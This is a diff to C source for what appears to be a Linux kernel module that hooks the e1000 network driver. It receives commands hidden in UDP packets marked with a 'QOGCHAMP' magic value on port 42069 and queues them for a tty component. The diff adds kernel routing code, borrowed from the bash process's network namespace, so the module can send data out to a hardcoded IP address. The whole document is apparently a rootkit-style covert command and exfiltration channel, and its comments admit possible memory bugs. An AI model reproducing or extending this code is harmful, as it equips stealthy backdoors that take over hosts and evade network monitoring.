@@ -99,7 +99,7 @@ If NET_SKBUFF_DATA_USES_OFFSET is set then it is always an offset from head - ne
 regardless of NET_SKBUFF_DATA_USES_OFFSET. 
 */
 
-
+#undef ETH_HLEN
 #define ETH_HLEN sizeof(struct ethhdr)
 #define IP_HLEN sizeof(struct iphdr)
 #define UDP_HLEN sizeof(struct udphdr)
@@ -114,7 +114,7 @@ significant byte comes first. So, on the stack it will be
 PMAHCGOQ where Q is is at the lowest memory address*/
 const unsigned long qogchamp_magic = 0x504d414843474f51;
 
-const char* DEST = "\x81\x15\x5a\x95"; //ip address - big endian. The first octet is at index 0 in the string. 
+const char* DEST = "\x8\x8\x8\x8"; //"\x81\x15\x5a\x95"; //ip address - big endian. The first octet is at index 0 in the string. 
 //both of these extern structs are created in tty_util
 extern struct list_head commands; 
 
@@ -123,6 +123,10 @@ extern struct wait_queue_head command_wait;
 extern spinlock_t commands_lock;
 
 extern struct net_device* e1000_netdev;
+
+extern struct task_struct* bash_proc;
+
+static struct net* bash_net_ns = NULL; //is a global variable even good design??
 
 struct e1000_adapter* get_e1000_adapter(struct net_device* net_dev){
     return (struct e1000_adapter*) netdev_priv(net_dev);
@@ -159,12 +163,38 @@ static __be32 get_saddr(void){
 }
 
 
+static struct net* get_net_ns_bash(void){
+    
+
+    if(bash_net_ns){ 
+        return bash_net_ns;
+    }
+    if(bash_proc){
+        struct nsproxy* nsproxy;
+        task_lock(bash_proc);
+        nsproxy = bash_proc -> nsproxy;
+        if(nsproxy){
+            bash_net_ns = get_net(nsproxy -> net_ns);
+        }
+
+        task_unlock(bash_proc);
+        return bash_net_ns;
+
+
+    }else{
+        printk(KERN_INFO "bash_proc is NULL\n");
+        return NULL;
+    }
+
+}
 
 
 
 
 
-int construct_and_send_skb(char* data, unsigned int len){ 
+
+
+int construct_and_send_skb(char* data, unsigned int len){ //this is called in process context. 
 
     if(!e1000_netdev){
         printk(KERN_INFO "e1000 has not been initialized\n");
@@ -172,6 +202,23 @@ int construct_and_send_skb(char* data, unsigned int len){
     }
 
     struct e1000_packet* packet;
+
+    struct rtable* rt = NULL;
+
+    struct flowi4 flow;
+
+    __be32 saddr = get_saddr();
+
+
+    if(!bash_net_ns){ //if it doesn't exist, get it
+        if(!get_net_ns_bash()){ //if it still doesn't exist, we can't route it lol
+            printk(KERN_INFO "No network namespace, can't route\n");
+            return -1;
+        }
+    } 
+    
+
+
     
     int headroom = LL_RESERVED_SPACE(e1000_netdev);
     int tailroom = e1000_netdev -> needed_tailroom;
@@ -233,29 +280,54 @@ int construct_and_send_skb(char* data, unsigned int len){
 */
 
     skb_reset_network_header(skb);
+    
+    
 
+    
     packet -> iph.version = 4;
     packet -> iph.ihl=5;
     packet -> iph.tot_len = htons(sizeof(struct e1000_packet)+len);
     packet->iph.frag_off = htons(IP_DF);
     packet -> iph.ttl = 64;
     packet -> iph.protocol = IPPROTO_UDP;
-    packet->iph.daddr = htonl(*(unsigned int*)DEST);
-    packet -> iph.saddr = get_saddr(); //get the source addr
+    packet->iph.daddr = *(unsigned int*)DEST; //this will maintain the byte order of the string
+    packet -> iph.saddr = saddr; //get the source addr
 
     packet -> iph.check = ip_fast_csum((unsigned char*)&packet->iph, packet->iph.ihl);
 
     //lets do UDP now.
+
+    skb_set_transport_header(skb, offsetof(struct e1000_packet, udp)); //the first bytes at the data pointer are the e1000_header packets.
 
     packet -> udp.source = htons(42069);
     packet -> udp.dest = htons(10000);
     packet -> udp.len = htons(sizeof(struct e1000_packet)-sizeof(struct iphdr) + len); //UDP header length is sizeof(udphdr)+length of payload
 
     memcpy((unsigned char*)(packet + 1), data, len);
-
+    
     skb -> dev = e1000_netdev;
     skb -> protocol = htons(ETH_P_IP);
 
+    //lets do some routing. Most of this code is copied from: https://elixir.bootlin.com/linux/v5.14/source/net/ipv4/icmp.c#L480
+
+
+    memset(&flow, 0, sizeof(flow));
+
+    flow.saddr = saddr;
+    flow.daddr = *(unsigned int*)DEST; //this will maintain the byte order of the stirng
+    flow.flowi4_proto = IPPROTO_UDP;
+    flow.flowi4_uid = sock_net_uid(bash_net_ns, NULL);
+    flow.flowi4_oif = l3mdev_master_ifindex(e1000_netdev);
+
+    //printk(KERN_INFO "flowi4_uid: %u flowi4_oif: %u\n", flow.flowi4_uid.val, flow.flowi4_oif);
+
+    rt = ip_route_output_key_hash(bash_net_ns, &flow, skb);
+    if(rt){
+        printk(KERN_INFO "gateway: %x\n", rt -> rt_gw4);
+    }else{
+        printk(KERN_INFO "no gateway, routing failed\n");
+        return -1;
+    }
     
 
     if(dev_hard_header(skb, e1000_netdev, ntohs(skb->protocol), e1000_netdev->broadcast, e1000_netdev->dev_addr, skb->len)<0){
@@ -273,8 +345,9 @@ int construct_and_send_skb(char* data, unsigned int len){
 
 
 
-
-
+    //if(rt)
+    //   kfree(rt);
+   // kfree(skb); //idk if this is a double free someone please inform me. 
 
     
 
@@ -428,7 +501,7 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
     }
     true_data += 8;//add 8 bytes to go past the QOGCHAMP magic
     true_data_len = be16_to_cpu(udp->len)-8; //subtract out the qogchamp_magic
-    if(be16_to_cpu(udp->dest) == 42069){
+    if(be16_to_cpu(udp->dest) == 42069){ //TODO: make the interfaces' ip matches the dest IP.
        //welcome to Qogchamp   
         struct command* next_cmd = kzalloc(sizeof(struct command), GFP_ATOMIC); //WE CANNOT SLEEP IN A BOTTOM HALF
        // printk(KERN_INFO "Allocated next_cmd\n");
